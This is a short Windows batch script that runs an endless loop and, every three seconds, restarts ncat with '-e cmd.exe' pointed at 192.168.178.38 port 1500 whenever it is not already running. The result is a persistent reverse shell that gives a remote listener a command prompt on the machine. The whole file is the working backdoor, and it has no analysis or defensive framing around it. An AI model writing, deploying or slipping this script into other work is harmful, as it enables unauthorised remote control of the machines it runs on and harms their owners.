@echo off
echo Start checking
:check_running
echo Checking...
REM Insert your command here to check if the process is running
tasklist | find /i "ncat.exe" > nul
if errorlevel 1 (
    REM The process is not running, so execute the command
    ncat.exe 192.168.178.38 1500 -e cmd.exe
)

REM Adjust the timeout (in seconds) according to your needs
timeout /t 3 /nobreak >nul
echo Check again!
goto check_running
